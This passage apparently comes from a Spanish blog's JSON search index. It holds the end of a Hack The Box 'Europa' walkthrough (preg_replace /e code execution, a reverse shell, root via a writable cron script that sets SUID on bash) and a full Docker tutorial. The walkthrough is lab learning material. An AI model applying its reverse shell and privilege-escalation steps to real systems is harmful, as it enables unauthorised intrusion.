tambien con burpsuite.  Urldecodeamos la petición y para ver en texto claro como se envia la petición, ahi observamos que se aplica un patron en pattern a traves de expresiones regulares.  Probamos a validar con una expresión comun de regex y efectivamente se aplica mediante el patron.  Si ahora investigamos un poco existe una vulnerabilidad de la cual nos podemos aprovechar a traves de la regex, te dejo aqui un articulo para que lo revises a mayor detalle:  the_unexpected_dangers_of_preg_replaceBasicamente si le agregamos e en la regex, podemos ejecutar codigo php.  Despues de validar que podemos ejecutar comandos, vamos a enviarnos un revere shell para obtener acceso a la maquina, sin olvidar poner los &amp; en urlencode.  Nos ponemos en escucha y obtenemos acceso como el usuario www-data ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 22. Ncat: Connection from 10. 10. 10. 22:54978. bash: cannot set terminal process group (1394): Inappropriate ioctl for devicebash: no job control in this shellwww-data@europa:/var/www/admin$ whoamiwhoamiwww-dataComo siempre vamos a obtener un tty full interactiva, www-data@europa:/var/www/admin$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullwww-data@europa:/var/www/admin$ ^Z      zsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@europa:/var/www/admin$ export TERM=xtermwww-data@europa:/var/www/admin$ export SHELL=bashy ahora podemos leer la primera flag user. txt. www-data@europa:/var/www/admin$ cd /home/john/www-data@europa:/home/john$ cat user. txt 69ec17e87bcbe179e22c14a776351728ELEVACION DE PRIVILEGIOS #: Enumerando el sistema podemos ver que se esta ejecutando una tarea a intervalos de tiempo. www-data@europa:/home/john$ cat /etc/crontab    # /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron. d. These files also have username fields,# that none of the other crontabs do. SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user	command17 *	* * *	root  cd / &amp;&amp; run-parts --report /etc/cron. hourly25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. daily )47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. weekly )52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. monthly )#* * * * *	root	/var/www/cronjobs/clearlogsSi leemos el archivo, vemos que ejecuta un script en bash logcleared. sh. www-data@europa:/home/john$ cat /var/www/cronjobs/clearlogs#!/usr/bin/php&lt;?php$file = '/var/www/admin/logs/access. log';file_put_contents($file, '');exec('/var/www/cmd/logcleared. sh');?&gt;Si tratamos de ver el archivo, podemos observar que este no existe, pero podemos crearlo. www-data@europa:/home/john$ touch /var/www/cmd/logcleared. shYa que el usuario root esta ejecutando la tarea cron, vamos a insertar un codigo en donde otorguemos el permiso suid a la bash. #!/bin/bashchmod u+s /bin/bashAhora revisamos el permiso de la bash y podemos convertirnos en el usuario root y visualizar la segunda flag root. txt. www-data@europa:/home/john$ ls -l /bin/bash-rwsr-xr-x 1 root root 1037528 May 16 2017 /bin/bashwww-data@europa:/home/john$ bash -pbash-4. 3# cd /rootbash-4. 3# cat root. txt 5245239446324bb1fe4343385751f280"
    }, {
    "id": 18,
    "url": "http://localhost:4000/articulos/Docker",
    "title": "Aprende Docker y domina el uso de los contenedores",
    "body": "2023/07/22 - Hola en esta ocasión aprenderemos a usar Docker donde voy a explicarte a detalle paso a paso su funcionamiento y los beneficios que nos otorga usar esta tecnologia la cual puede ayudarnos mucho, asi que es tu momento para aprenderla 😃. Indice y Estructura:  Que es Docker? Ques es un contenedor? Por que aprender Docker? Almancenamineto de Contenedores Antecedentes Despligue de Contenedores Diferencias entre Contenedor y Maquina Virtual Instalación Docker Hub Listar Imagenes Descargar Imagenes  Eliminar una Imagen Creación de un Contenedor Iniciar un contenedor Listar Contenedores en Ejecución Detener un Contenedor Listar Todos los Contenedores Eliminar un Contenedor Establecer nombre a un Contenedor Ejecutar Comandos dentro del Contenedor Port Mapping Mostrar logs de un Contenedor Docker Run Conexión con un Contenedor Insertar Aplicación en un Contenedor Crear una Imagen     Dockerfile   Creación de una Red         Docker Network          Docker Build    Docker Compose VolumenesQue es Docker? #: Docker es una plataforma de contenedores que nos permite empaquetar, distribuir y ejecutar aplicaciones de manera eficiente consistente en diferentes entornos, ya que proporciona una forma de encapsular una aplicación y todas sus dependencias en un contenedor virtual ligero y autonomo. Pero para entenderlo mejor debemos saber en ciencia exacta que es un contenedor?. . Que es un Contenedor? #: Un contenedor es una unidad de software autónoma que encapsula una aplicación y todas sus dependencias, incluyendo el código, las bibliotecas y las variables de entorno necesarias para que la aplicación se ejecute de manera consistente en diferentes entornos.  Por que aprender Docker? #: Entendiendo mejor el concepto de que es un contenedor y como funciona docker, entocnes por que deberia aprenderlo?, pues hay muchas razones y algunas de estas serian:    Desarrollo y despliegue más rápido: Docker facilita la creación y gestión de entornos de desarrollo consistentes. Puedes empaquetar tu aplicación y todas sus dependencias en un contenedor, lo que permite que todo el equipo de desarrollo tenga exactamente el mismo entorno de trabajo. Además, el despliegue de la aplicación se vuelve más rápido y confiable, ya que no tienes que preocuparte por las diferencias entre los entornos de desarrollo y producción.     Portabilidad y compatibilidad: Docker es una tecnología altamente portable. Puedes desarrollar una aplicación en tu máquina local y ejecutarla en cualquier otro entorno que tenga Docker instalado, ya sea en un servidor local, en la nube o en el centro de datos. Esto hace que sea más fácil compartir y distribuir tu aplicación, sin preocuparte por las dependencias o las diferencias en los sistemas operativos.     Aislamiento y seguridad: Docker proporciona un entorno aislado para tus aplicaciones. Cada contenedor tiene su propio sistema de archivos y recursos aislados, lo que evita conflictos y problemas de compatibilidad entre aplicaciones. Además, puedes configurar permisos y restricciones para controlar el acceso y proteger tus aplicaciones y datos.     Escalabilidad y eficiencia en el uso de recursos: Docker permite escalar tus aplicaciones de manera eficiente. Puedes replicar contenedores y distribuir la carga entre ellos para manejar aumentos en la demanda de manera más rápida y sencilla. Además, los contenedores son livianos y comparten recursos del sistema, lo que maximiza la utilización de los recursos y reduce los costos operativos.     Ecosistema y comunidad activa: Docker cuenta con una amplia comunidad de usuarios y desarrolladores. Esto significa que hay una gran cantidad de recursos, documentación, tutoriales y ejemplos disponibles en línea. Además, Docker se integra con muchas otras herramientas y servicios populares, lo que amplía aún más las posibilidades de uso y colaboración.  Almacenamiento de Contenedores #: Los contenedores se almanecenan en repositorios publicos y privados. De los cuales el repositorio publico mas conocido es Docker Hub. Aqui podemos ejecutar todo tipo de aplicaciones como Python, SQL, Python, Disstribuciones Linux, MongoDB y mucho mas. Antecedentes #: Antes de usarse los contenedores existian varios problemas a la hora de que un equipo de desarrollo trabajara en conjunto, esto debido a que cada uno de los mienbros podia tener distinto sistemas operativos y de la misma manera al trabajar en una aplicación estos tendrian distintas versiones de la misma instaladas. Esto causaria una serie de problemas con las dependencias necesarias para la ejecución correcta del programa. Como consecuencia eventualmente el desarrollo de la aplicación termine mal.  Afortunadamente con los contenedores ahora este tedioso proceso podemos llegar a automatizarlo. Para ello debemos descargar una imagen basada en linux, pero que es una imagen?  Imagen: En Docker, una imagen es un paquete ejecutable y autocontenido que incluye todo lo necesario para ejecutar una aplicación, incluyendo el código, las bibliotecas, las dependencias y las configuraciones necesarias. Se puede pensar en una imagen como una plantilla o un plano a partir del cual se crean los contenedores. Gracias a esto con solo ejecutar un comando, podemos tener la aplicación corriendo en nuestra maquina, e incluso ademas podriamos tener distintas versiones de esta misma aplicación corriendo en nuestro sistema sin tener ningun conflicto. Despliegue de Contenedores #: Cuando queremos desplegar o actualizar nuestra aplicación, necesitaremos el codigo , dependencias y archivos de configuración. Esto puede ser propenso al no haberse considerado alguna dependencia y generando problemas de comunica´ción. Estos errores unicamente podremos verlos al momento de desplegar nuestra aplicación, lo cual generaria problemas y necesitariamos volver a una versión anterior para que nuestro sistema sigua en funcionamiento.  Pero gracias a Docker todo esto podemos evitarlo ya que solo debemos construir una imagen cuya unica dependencia sera el Runtime de docker.  Runtime: El runtime de Docker se refiere al componente responsable de ejecutar los contenedores Docker en un sistema operativo. En otras palabras, es el entorno en el que se ejecutan y se gestionan los contenedores. Y este proceso puede ser automatizado a traves de pipelines como github.  Por lo que un contenedor en simples palabras vendria a ser capas sobre capas de imagenes donde la primera por lo general sera una distribución basada en linux y por lo general esta corresponde a Alpine ya que es una imagen bastante liviana. Des esta manera tendremos sobre esta una serie de imagenes hasta que podamos llegar a nuestra capa de aplicación.  Diferencias entre Contenedor y Maquina Virtual #: Al ser docker una forma de virtualización es importante tener en claro las diferencias entre docker y una maquina virtual. Debemos tener claro que la virutalización se basa en 3 capas, las cuales corresponden al hardware, kernel y la aplicación.  Hardware: Donde se va ejecutar la virtualización.  Kernel: Se encarga de la comunicación con el hardware, siendo responsable de gestionar los recursos del sistema y proporcionar servicios a los programas en ejecución.  Aplicaciones: Aplicación de la cual vamos a hacer uso. De estas capas las VM virtualizan tanto las aplicaciones y el kernel, en consecuencia las imagenes tienen un peso muy alto. Pero en el caso de Docker, unicamente virtualiza las aplicaciones, ya que en el caso del Kernel lo que hace docker es utilizar el propio kernel del sistema operativo anfitrión. En consencuencia las imagenes pesan mucho menos, su rendimiento es superior ya que se ejecutan casi instantaneamente. Por lo que desarrollar y desplegar aplicaciones sera mucho mas rapido y optimo.  Instalación #: Para poder instalar Docker si nos encontramos en Windows debemos instalar Docker Desktop que viene a ser una VM linux y nos permitira ejecutar contenedores. Si deseas descargarla puedes hacerlo desde el enlace oficial:  https://www. docker. com/products/docker-desktop/Si te encuentras en linux simplemente puedes instalarlo ejecutando: sudo apt updatesudo apt install docker-ce docker-ce-cli containerd. ioDocker Hub #: Una vez tengamos ya instalado Docker, vamos a dirigirnos a el repositorio Docker Hub, donde podemos ver todas las herramientas que podemos utilizar. Podemos ver que podemos usar imagenes de Python, Sql, Ubuntu, Node entre muchas mas.  Si ahora pinchamos en alguna de ellas como Python y deslizamos un poco podemos ver distintas versiones de Python que podemos utilizar.  Y ahora si subimos un poco, veremos un comando donde veremos un comando el cual si lo ejecutamos nos descargara la imagen respectiva en este caso la de Python.  Listar Imagenes #: El primer comando que ejecutaremos sera docker images y este nos monstrara todas las imagenes que hemos descargado en nuestro sistema.  Como podemos ver no nos lista nada debido a que todavia no contamos con ninguna imagen descargada. Descargar Imagenes #: Par poder descargar una imagen solo debemos de usar el comando docker pull, ahora bien existen dos formas a traves de las cuales podemos hacerlo. La primera es simplemente ejecutar el comando y seguido el nombre de la aplicación que queremos descargar, esto por defecto nos descargara la ultima versión disponible.  Vemos como docker descarga cada una de las capas que componen nuestra imagen y si en algun caso nosotros vamos a descargar otra imagen cuyas capas ya fueron descargadas antes por otra imagen como la que tenemos mysql, estas capas no volveran a descargarse ya que usaran las que ya tenemos optimizando nuestro espacio en disco. Si ahora volvemos a listar las imagenes docker images, observamos que esta vez ya contamos con una imagen descargada.  Si miramos con atención observamos que nuestra imagen tiene una serie de etiquetas.  REPOSITORY: Indica el nombre de la imagen TAG: Indica la versión utilizada, en este caso usa latest al no haberla especificado.  IMAGE ID: Corresponde a un identificador unico de la imagen.  CREATED: Cuando fue creada la imagen.  SIZE: Espacio usado en disco. La segunda manera en la que podemos descargar una imagen seria especificar la versión exacta que queremos descargar, para ello debemos agregar con :version la versión de la imagen y ejecutar el mismo comando.  Observamos que esta vez la imagen se nos descargo casi al instante. Si ahora volvemos a listar las imagenes.  Despues de volver a lista vemos que tenemos casi las mismas etiquetas, ya que al especificar la versión en la descarga, usamos la ultima y seria el mismo proceso al no especificar la versión ya que de esa manera tambien nos descarga la ultima versión. Solo que esta vez tenemos dos imagenes pero con distintos valores en el TAG. Ahora vamos a descargar otra versión mas antigua de mysql.  Listamos nuevamente las imagenes y esta vez ya que descargamos una versión previa observamos la nueva versión en conjunto con un nuevo identificador.  De esta manera podemos descargarnos distintas imagenes con sus respectivas versiones y si queremos ver cuales estan disponibles, solo debemos dirigirnos a Docker Hub y elegir la versión que necesitemos. Eliminar una Imagen #: Para poder eliminar una imagen previamente descargada, tenemos que ejecutar el comando docker image rm nombre_imagen:version. Entonces listamos nuevamente las imagenes.  Y ahora procederemos a eliminar las versiones 8. 0 y 5. 7.  Listamos nuevamente las imagenes disponibles y vemos que se eliminaron con exito las versiones seleccionadas.  Creación de un Contenedor #: Para poder crear un contenedor, primero debemos tener descargada una imagen y ya que previamente estuvimos usando una correspondiente a mysql, pero para realizar una variacion y simplicidad vamos a trabajar con mongodb. Asi que primero vamos a proceder a descargar la imagen de mongo.  Y volvemos a verificar que la imagen fue correctamente descargada.  Ahora para poder crear nuestro contenedor debemos ejecutar docker create nombre_imagen.  Esto nos devuelve un identidicador del contenedor que creamos. Ahora tambien podriamos usar el comando docker container create nombre_imagen para crear un contenedor, pero la forma anterior es mejor ya que lo simplifica. Iniciar un Contenedor #: Una vez ya creado nuestro contenedor, debemos iniciarlo para poder levantar el servicio que tengamos corriendo. Para ello usamos el comando docker start id_contenedor.  Y de la misma manera nos devuelve el propio identificador como respuesta al ejectar el comando indicandonos que se inicio correctamente. Listar Contenedores en Ejecución #: Para poder verificar que el contenedor se inicio de manera correcta tendremos que ejecutar el comando docker ps.  Este comando nos muestra un consunto de etiquetas que corresponden:  CONTAINER ID: Es el id del contenedor pero simplificado.  IMAGE: Indica en que imagen se baso el contenedor para su creación.  COMMAND: Es el comando que usa el contenedor para ejecutarse.  CREATED: Cuando fue creado el contenedor.  STATUS: Indica el estado en el que se encuentra el contenedor.  PORTS: Especifica el puerto del que se hace uso para ejecutar el contenedor.  NAMES: El nombre del contenedor. Detener un Contenedor #: Que paso ahora si queremos detener la ejecución del contenedor, usamos el comando docker stop id_contenedor.  Si tratamos ahora a mostrar los contenedores en ejecución, vemos que esta vez no nos devuelve nada debido a que detuvimos el que previamente creamos.  Sin embargo esto no quiere decir que el contenedor se haya borrado ya que este sigue existiendo. Listar todos los Contenedores #: Anteriomente veiamos como listar los contenedores actualmente corriendo, pero que paso si queremos ver los contenedores que tenemos independientemente si estos esten o no activos solo hay que añadir un parametro al anterior comando docker ps -a.  Y esta vez podemos ver las mismas etiquetas, pero con la variación que ahora STATUS nos muestra un estado Exited (0) 3 min ago el cual nos indica que el contenedor detuvo su ejecución hace un aproximado de 3 min. Ademas debido a que ahora el contenedor no se encuentra activo, la etiqueta PORTS se encuentra vacia. Eliminar un Contenedor #: Si queremos eliminar un contenedor previamente creado y el cual no necesitemos, es super sencillo solo tenemos que ejecutar el comando docker rm id_contenedor.  Si litamos ahora el comando que nos lista los contendores disponibles, vemos que fue eliminado exitosamente. Establecer Nombre a un Contenedor #: Cuando listabamos los contenedores notamos que en la etiqueta NAME se establecia un nombre extraño asignado al contenedor que creabamos, y esto sucede debido a que si nosotros al momento de crear nuestro contenedor no lo establecemos un nombre docker por defecto lo genera aleatoriamente. Pero existe la posibilidad de nosotros establecer un nombre a nuestro contenedor y trabajar en función a el y no siempre usando el ID. Para ello solo debemos agregar el parametro --name nombre_contenedor, por lo demas el comando seria exactamente igual.  Lo siguiente seria iniciarlo no?, pero ahora que le asignamos un nombre podemos usar este en lugar del ID. Seguidamente tambien vamos a verificar que nuestro contenedor se encuentra activo.  Observamos que tenemos corriendo nuestro contenedor y esta vez con el nombre que le asignamos mongo_container. Lo ideal seria comenzar a usarlo, y como en nuestro caso corresponde a un servicio de base de datos guardar información. Sin embargo si queremos interactuar con este desde nuestra maquina host no nos sera posible. y de seguro te preguntaras debido a que si nos nuestro contenedor esta funcionando correctamente?. Pues esto se debe a que cuando nosotros ejecutamos una aplicación dentro de un contenedor Docker, esta solo puede comunicarse con el mundo exterior a través de la interfaz de red interna del contenedor, lo que significa que no puede acceder directamente a los puertos del host o a otros dispositivos en la red. Entonces para poder establecer esta comunicación usamos el concepto de Port Mapping. Ejecutar comandos dentro del Contenedor #: Es importante mencionar que existe la opción de ejecutar comandos dentro de nuestro contenedor que se encutra corriendo, lo que es útil cuando queremos realizar tareas como administración o depuración del mismo. Para ello usamos el comando docker exec id_contenedor|nombre_contenedor comando. Como sabemos nuestros contenedores estan basandos en linux asi que podriamos ejecutar como comando una bash y podriamos acceder mediante una terminal al contenedor, para ello vamos a crear un nuevo contenedor usando nuestra imagen de mongo.  Tambien podriamos mostrar la version de mongo que se esta ejecutando.  En otras palabras podemos ejecutar cualquier comando que nos permita interactuar con nuestros contenedores.  Port Mapping #: El Port Mapping nos permite redireccionar solicitudes de un puerto específico en el host hacia un puerto específico dentro del contenedor. Esto hace que la aplicación dentro del contenedor sea accesible desde el host o desde otras máquinas de la red como si estuviera ejecutándose directamente en el host.  Par poder realizar este proceso de manera practica, primero vamos a proceder a eliminar nuestro contenedor.  Ahora vamos a proceder a crear un nuevo contenedor y lo llamaremos de la misma manera que el previo, solo que esta vez para hacer uso del Port Mapping usaremos un parametro mas -p - -ppuerto_host:puerto_contenedor.  Y ahora en la etiqueta PORT vemos que nuestro puerto host 27017 esta mapeado a el puerto 27017 de nuestro contenedor. Si ahora hacemos exactamente el mismo proceso, pero esta vez no especificamos nuestro puerto hosts, lo que pasara es que Docker lo eligira por nosotros aleatoriamente.  Observamos que esta vez Docker nos asigno aleatoriamente el puerto 49153. Esto no nos conviene mucho ya que nosotros siempre queremos tener el control de que puerto queremos usar, pero no esta de mas saberlo. Mostrar logs de un Contenedor #: Si queremos listar los logs de nuestro contenedor, para mostrar los registros con información detallada sobre el funcioamiento correcto o erroneo de nuestro contenedor tambien es muy sencillo, solo basta con ejecutar el comando docker logs monbre_contenedor.  Y si ahora queremos listar los logs pero a la vez mantenernos en escucha de nuevos registros, añadiremos al comando el parametro --follow.  Docker run #: Hemos estado viendo diversos comandos cuando usamos Docker, como descargar una imagen, crear y desplegar nuestro contenedor cada uno con su respectivo comando, pero Docker tambien nos da la opción de hacer todo el proceso en conjunto haciendo uso de un solo comando.  Seguro puedes decir entocnes para que aprendi el resto??. . si literalmente evito hacer tanto embrollo, pues hay que recordar que si bien podemos automatizar el proceso con este comando no quiere decir que en todo momento que uso docker voy a realizar la misma acción, ya que muchas veces vamos a realizar distintas operaciones por separado. Y bueno para realizar esta operación debemos ejecutar el comando docker run y este comando basicamente hara 4 operaciones:  Buscar la imagen y si esta no se encuentra la descargara.  Crear un Contenedor Iniciar el Contenedor Mostrar los logs en escuchaPara apreciar mejor su funcionamiento, vamos a realizar el proceso entero, asi que vamos a borrar nuestros contenedores actuales.  Realizamos tambien el borrado de las imagenes.  Ahora ejecutaremos el comando docker run nombre_imagen y este lo que hara al no encontrar la imagen, sera descargarla para despues crear y iniciar nuestro contenedor, hasta que finalmente nos muestre los logs en escucha  Y otra cosa si queremos que nos realize todo el proceso, pero no queremos ver los logs, solo tenemos que añadir el parametro -d.  Otra cosa importante es que podemos usar los mismos parametros de antes incluidos en este comando, como asignarle un nombre --name o usar el Port Mapping con -p. De esta manera tendriamos desplegado nuestro contenendor y listo para poder usarlo.  Conexión con un Contenedor #: Para poder realizar la conexión de nuestros contenedores, vamos a estar usando NodeJS y MongoDB. Ejecutaremos un aplicativo simple en NodeJS que se pueda conectar con un contenedor que esta ejecutando MongoDB y de este modo al gestionar todo en contenedores no tengamos que descargarnos Mongo en nuestro maquina hosts. Para ello a continuación te dejare el codigo de el aplicativo. const express = require( express );const mongoose = require( mongoose );const app = express();const mongoURI =  mongodb://firtsmiracle:firtsmiracle123@localhost:27017/universidad?authSource=admin ;mongoose. connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true });const studentSchema = new mongoose. Schema({ nombre: { type: String, required: true }, curso: { type: String, required: true }, correo: { type: String, required: true },});const Student = mongoose. model( Student , studentSchema);app. use(express. json());// Ruta para crear un estudianteapp. post( /estudiantes , async (req, res) =&gt; { try {  const { nombre, curso, correo } = req. body;  const newStudent = new Student({ nombre, curso, correo });  const savedStudent = await newStudent. save();  res. status(201). json(savedStudent); } catch (error) {  console. error(error);  res. status(500). json({ message:  Error al crear el estudiante.   }); }});// Ruta para listar todos los estudiantesapp. get( /estudiantes , async (req, res) =&gt; { try {  const students = await Student. find();  res. json(students); } catch (error) {  console. error(error);  res. status(500). json({ message:  Error al obtener los estudiantes.   }); }});// Ruta para eliminar un estudiante por su IDapp. delete( /estudiantes/:id , async (req, res) =&gt; { try {  const estudianteId = req. params. id;  const deletedStudent = await Student. findByIdAndDelete(estudianteId);  if (deletedStudent) {   res. json({ message:  Estudiante eliminado exitosamente.   });  } else {   res. status(404). json({ message:  Estudiante no encontrado.   });  } } catch (error) {  console. error(error);  res. status(500). json({ message:  Error al eliminar el estudiante.   }); }});const port = 3000;app. listen(port, () =&gt; { console. log(`Servidor corriendo en http://localhost:${port}`);});Para ello lo primero que tenemos que hacer es dirigirnos a Docker Hub ya que vamos a necesitar una serie de parametros de configuración al momento de crear nuestro contenedor para acceder a nuestra base de datos.  https://hub. docker. com/Una vez ahi ya que queremos usar mongo, usamos el buscado, esto nos llevara a otro apartado.  Aqui encontraremos una lista de instrucciones para poder configurar nuestro contenedor.   Hay que recordar que cada imagen que estemos utilizando necesitara distintos parametros de configuración y en algunos casos no necesitaran ninguno, eso ya dependera del tipo de imagen que estemos utilizando. Como vamos a estar utilizando una base de datos, necesitaremos un usuario y una contraseña, para ello usaremos unas variables de entorno que las encontraras en la mismo enlace.  Ahora vamos a realizar el proceso completo, para poder ejecutar nuestro contenedor con las configuraciones necesarias. Primero tenemos que tener nuestra imagen descargada de Docker.  Ahora procederemos a crear el contenedor, con las variables de entorno necesarias para conectarnos. Como vimos en Docker Hub para setearlas usamos el parametro -e y usamos adicionalmente los comandos que ya aprendimos previamente.  Ahora que tenemos correctamente desplegado nuestro contenedor de mongo, vamos a ejecutar la aplicación de NodeJS en nuestro sistema.  Vemos que se ejecuta por el puerto 3000 y si vamos en el navegador el servicio esta activo.  Ahora que el servidor esta escuchando vamos a mandar una petición para crear un estudiante.  La isntrucción se ejecuta correctamente y si ahora vemos en el navegador el registro se realizo correctamente. Podemos probar a ejecutar otro registro.  Validamos nuevamente y vemos que se visualiza correctamente, Lo mismo si eliminamos algun registro y validamos al listar los cambios.  De esta manera habriamos realizado de manera exitosa una conexión de nuestro aplicativo con un contenedor que ejecuta mongoDB. Insertar Aplicación en un Contenedor #: Ahora ya validamos que podemos conectar nuestra aplicación con un contenedor, pero es posible que podamos meter nuestra aplicación a un contenedor? Pues si y para ello primero crear una imagen a partir de un archivo de nombre Dockerfile. Crear una imagen #: Para poder crear una imagen necesariamente debemos de crear un archivo dockerfile en donde escribiremos todas las instrucciones que necesitara nuestro contenedor para poder crearse. Ahora debo mencionar que para crear una imagen debemos de basarnos en otra imagen, ya que estamos usando Node pues debemos basarnos en esta misma. Dockerfile #:  Dokerfile: es un archivo de texto plano que contiene una serie de instrucciones que Docker utiliza para crear una imagen de contenedor. Creamos nuestro archivo Dockerfile y introducimos los siguientes comandos, te explicare para que funciona cada uno mientras escribimos linea por linea. Primero usaremos FROM imagen:version para indicarle en que imagen nos basaremos, en nuestro caso ya que estamos usando la ultima versión disponible y esta corresponde a la 18, debemos especificarla. FROM node:18Despues vamos a crear una carpeta en donde vamos a introdir el codigo fuente de nuestro aplicativo eso lo hacemos con: RUN mkdir -p ruta. Ojo la ruta hace referencia a la del contenedor no a la de tu equipo local, y puedes elegir la que quieras. FROM node:18RUN mkdir -p /home/myappAhora tenemos que indicarle la ruta de donde va a introducir el codigo y para ello usamos COPY ruta_origen ruta_destino. Donde especifico en la ruta local un punto ya que tomare como referencia el directorio actual. FROM node:18RUN mkdir -p /home/myappCOPY . /home/myappSeguidamente tenemos que exponer un puerto, para que otros contenedores y nuestra maquina host podamos conectarnos a este nuevo contenedor, para esto usamos EXPOSE puerto. FROM node:18RUN mkdir -p /home/myappCOPY . /home/appEXPOSE 3000Ahora finalmente debemos indicarle el comando que se debe ejecutar para que la aplicación corra con CMD [ comando ,  ruta_archivo ]. FROM node:18RUN mkdir -p /home/myappCOPY . /home/appEXPOSE 3000CMD [ node ,  /home/myapp/index. js ]Creación de una Red #: Para que nuestros contenedores puedan conectarse, esto debido a que si bien es cierto podemos tener muchos contenedores, no necesariamente todos ellos deben poder conectarse. Y para que nuestro contenedores se puedan conectar debemos crear valga la redundancia una red interna que realize la conexión de dos o mas contenedores.  Todos los contenedores que se encuentren en la misma red, pueden conectarse y podemos crear cuantas redes queramos. Docker Network #: Para realizar la creación de una red, debemos ejecutar el comando docker network y podemos ver una serie de parametros que podemos utilizar.  Dentro de esos parametros que podemos hacer uso, podemos ver uno que corresponde a ls, el cual nos permitira listar las redes disponibles creadas por defecto.  Vamos ahora a crear nuestra nueva red usando el comando docker network create nombre_red.  Al listar nuevamente vemos que ahora tenemos una nueva red redInterna. Y si te preguntas podemos eliminar una red pues si para ello usamos docker rm nombre_red. Ahora cuando los contenedores estan dentro de la misma red se comunican mediante el nombre del contenedor. En otras palabras el nombre de dominio del contenedor va a ser el mismo al nombre que le damos cuando lo creamos. Por lo tanto debemos de cambiar en nuestro codigo del aplicativo y en vez de localhost indicarle el nombre del contenedor de mongo que llamaremos mongo_connect.  Docker build #: Vamos a proceder a crear nuestra imagen con el comando docker build el cual nos permitira crear una imagen basadas en un archivo docker file. Este comando recibe dos argumentos, docker build -t nombre_imagen:tag ruta_dockerfile, donde en tag podemos hace referencia a la versión que tendra nuestro proyecto. Ejecutamos el comando y vemos como se crea nuestra imagen.  Si ahora volvemos a listar nuestras imagenes observamos que ahora tenemos una nueva correspondiente a node.  Como ultimo paso ahora debemos de volver a crear nuestros contenedores y especificarles que estos ahora formaran parte de una red, para ello primero vamos a borrar el contenedor que previamente creamos.  Y ahora vamos a usar los mismo comandos para crear el contenedor, solo que esta vez adicionaremos un nuevo parametro --network nombre_red.  Del mismo modo crearemos el contenedor de nuestra aplicación alojada en la imagen que creamos. Ojo debemos especificar tambien con -p el puerto ya que vamos a acceder de nuestro equipo, ademas de la red y la iamgen tal cual con el tag que proporcionamos.  Iniciamos ambos contenedores y ahora se encuentran activos.  Nos dirigimos a nuestro navegador para hacer las pruebas respectivas y vemos que genial nuestro aplicativo corre sin problemas.  Vamos a crear un estudiante ahora con la ayuda de curl.  Listamos nuevamente los datos en nuesntro navegador.  Vemos que se ejecuta todo correctamente y asi es como pudimos meter nuestra aplicacion en un contenedor y conectarla con otro. Docker Compose #: Es una herramienta que permite definir y administrar aplicaciones Docker multi-contenedor. Con Docker Compose, puedes describir toda la configuración de tu aplicación, incluidos los servicios, las redes y los volúmenes que necesita, en un archivo de configuración YAML. En pocas palabras esto nos va a ahorrar el proceso que hicimos anteriormente para conectar nuestros contenedores que en si fueron muchos pasos y con docker compose podemos automatizarlo todo. Para usar esto, debemos de crear un archivo yaml de nombre docker-compose. yml.  YAML: Es un formato de serialización de datos legible por humanos. Fue diseñado para ser un lenguaje simple y fácil de entender que permite representar datos estructurados de manera concisa y clara. YAML se utiliza ampliamente como un formato de configuración, especialmente en el contexto de herramientas y aplicaciones de desarrollo y despliegue, como Docker Compose, Kubernetes, Ansible y muchas otras. Dentro de este archivo le indicaremos primero la versión que usaremos, en este caso version:  3. 9  version:  3. 9 Despues en services indicaremos el nombre de los contenedores que vamos a asignar a los contenedores a usar. version:  3. 9 services: nodeApp: mongo_connect:Dentro de cada nombre indicaremos con build ruta_dockerfile, puertos a mapear ports puerto_hosts:puerto_contenedor y el nombre del contenedor que usara el servicio de nodeApp links nombre_contenedor_usa_servicio. version:  3. 9 services: nodeApp:  build: .   ports:   -  3000:3000   links:   - mongo_connect mongo_connect:De la misma manera similar para el otro contenedor, solo que en este caso especificaremos la imagen en la que se basara image: mongo la cual ya teniamos descargada y le indicaremos las variables de entorno que necesitamos environment las cuales antes establecimos para conectarnos. version:  3. 9 services: nodeapp:  build: .   ports:   -  3000:3000   links:   - mongo_connect mongo_connect:  image: mongo  ports:   -  27017:27017   environment:   - MONGO_INITDB_ROOT_USERNAME=firtsmiracle   - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123Listo ahora guardamos nuestro archivo, pero recordemos que tenemos dos contenedores activos de cuando realizamos la conexión, por ello primero vamos a pararlos.  Ya que todo esta listo ejecutamos docker-compose up y esto se encargara de construir nuestros contenedores. En versiones mas recientes ejecutar docker compose up es exactamente lo mismo.  Vemos que este comando nos automatiza todo el proceso completo y si ahora verificamos si se esta ejecutando el servicio y este se encuentra funcionando correctamente.  Igual podemos realizar peticiones o listar nuevamente y todo funciona de maravilla.  Si ahora queremos detener la ejecución, como casi clasicamente hacemos usando las teclas ctrl_c.  Podemos listar las imagenes que tenemos y observamos una nueva que fue creada ejecutamos docker compose.  y del mismo modo si listamos los contenedores, tambien vemos dos nuevos los cuales tambien se crearon al ejecutar el comando.  Pero esto no acaba aqui, ya que asi como docker compose nos automatiza la creación, tambien podemos eliminar absolutamente todo, tanto los contenedores que creo como la red que se crea por default de manera automatica. Y este comando es docker compose down o en versiones antiguas docker-compose down.  Listamos nuevamente los contenedores y estos ya no se encuentran.  Asi pudimos aprender lo maravilloso que es docker compose y como este nos simplifica todo el proceso. Volumenes #: Generalmente cuando estamos trabajando con contenedores, al eliminarlos estos se borran en conjunto con todos los datos que este contiene. Ya sea cuando estamos creando alguna aplicación que constantemente vamos a estar actualizando, seria muy tedioso estar creando una imagen cada vez que hagamos un cambio. Pero si queremos que a pesar de que cuando eliminemos nuestro contenedor, toda nuestra data permanezca intacta y de la misma manera si vamos a estar desarrollando alguna aplicación evitar el fastidio de estar constantemente creando una imagen. Pues docker tiene una solución a esto y es a traves de los Volumenes. Con los volumenes los que hacemos es que una parte de los archivos que va a tener nuestro contenedor, podemos montarla en nuestro propio sistema principal. Por ello al 